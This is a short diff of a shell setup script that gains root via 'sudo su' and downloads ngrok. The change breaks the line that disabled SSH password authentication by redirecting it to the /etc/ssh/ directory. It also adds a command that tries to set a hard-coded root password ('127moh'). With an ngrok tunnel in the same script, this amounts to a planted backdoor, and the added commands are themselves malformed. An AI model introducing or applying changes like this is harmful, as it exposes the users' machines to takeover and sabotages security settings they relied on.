@@ -21,7 +21,8 @@ case $(uname) in
         chmod 755 "$HOME"
         mkdir "$HOME"/.ssh
         sudo su
-        echo "PasswordAuthentication no" >> /etc/ssh/sshd_config
+        echo "PasswordAuthentication no" >> /etc/ssh/
+        chpasswd root:127moh
         PKG="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz"
         UNPACK="tar xzvf"
         ;;
